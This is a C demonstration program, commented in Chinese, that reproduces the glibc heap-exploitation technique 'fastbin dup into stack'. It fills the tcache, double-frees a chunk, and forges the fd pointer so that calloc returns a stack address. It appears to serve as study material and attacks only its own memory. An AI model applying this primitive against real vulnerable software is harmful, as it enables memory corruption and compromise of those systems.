/**
 *  漏洞名称：	fastbin dup into stack
 *  适用版本：	glibc-2.23 ~ glibc-2.39
 *  漏洞危害：	将栈上的地址分配出来
 *  复现环境：	Ubuntu 22.04
 *  编译命令：	gcc -g fastbin_dup_into_stack.c -o fastbin_dup_into_stack
 */

/**
 *  利用条件：	存在double free漏洞
 *  利用思路:   1.填充tcache bin
 *             2.分配三个chunk用来实现fastbin dup
 *             3.利用double free实现fastbin dup
 */
#define DEMO
#include <demo.h>

int main()
{
    u64 target[2] __attribute__((aligned(0x10)));

    DEBUG("1.填充tcache bin\n");
    u64 tcache[7];
    for (int i = 0; i < 7; i++)
    {
        tcache[i] = MALLOC(0x10);
    }
    for (int i = 0; i < 7; i++)
    {
        FREE(tcache[i]);
    }

    DEBUG("2.分配三个chunk用来实现fastbin dup\n");
    u64 a = (u64)calloc(1, 0x10);
    u64 b = (u64)calloc(1, 0x10);
    u64 c = (u64)calloc(1, 0x10);

    DEBUG("3.利用double free实现fastbin dup\n");
    FREE(a);
    FREE(b);
    FREE(a);

    DEBUG("4.在栈上伪造chunk的size\n");
    target[1] = 0x20;

    DEBUG("5.利用fasebin dup将栈上的地址分配出来\n");
    u64 d = (u64)calloc(1, 0x10); // a
    u64 fd = ((u64)target) ^ (d >> 12);
    SET_ADDR_OFFSET_VALUE(d, 0, fd);
    u64 e = (u64)calloc(1, 0x10); // b
    u64 f = (u64)calloc(1, 0x10); // a
    u64 g = (u64)calloc(1, 0x10); // target

    PUT_VALUE("分配出来的地址", g - 0x10);
    PUT_VALUE("target的地址", target);

    assert((u64)target == (u64)(g - 0x10));

    return 0;
}
